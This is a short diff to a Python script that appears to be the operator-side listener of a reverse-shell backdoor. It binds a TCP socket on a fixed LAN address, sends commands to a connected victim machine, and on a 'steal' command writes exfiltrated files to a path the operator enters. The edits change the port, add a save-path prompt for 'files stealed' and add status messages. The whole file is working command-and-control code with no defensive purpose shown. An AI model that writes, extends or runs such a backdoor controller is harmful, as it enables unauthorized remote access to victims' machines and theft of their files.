@@ -1,10 +1,12 @@
 from socket import *
 
+PWD = input("Where do you want to save your files stealed? \nExample: /home/nonameon/Desktop/file\nPath: ")
+
 def connect():
     # TCP connection
     sock = socket(AF_INET, SOCK_STREAM)
     host = "192.168.1.8"
-    port = 111
+    port = 11
     buffer_size = 1024
     sock.bind((host, port))
     sock.listen(1)
@@ -20,6 +22,8 @@ def connect():
             if "terminate" in command:
                 client.send("terminate".encode())
                 client.close()
+                print("[+] Closed!")
+                print("[+] Listening {}:{}".format(host, port), end="")
                 break
             else:
                 #manda
@@ -28,11 +32,10 @@ def connect():
                 resp = client.recv(buffer_size)
                 flag = True
                 if "steal" in command:
-                    file_backdoor = "/home/nonameon/Scrivania/file"
+                    file_backdoor = PWD
                     print("[+] Start!")
                     with open(file_backdoor, "wb") as f:
                         while True:
-                            print("scritto")
                             f.write(resp)
                             resp = client.recv(buffer_size)
                             if "end-transfer-file" in resp.decode("ISO-8859-1"):
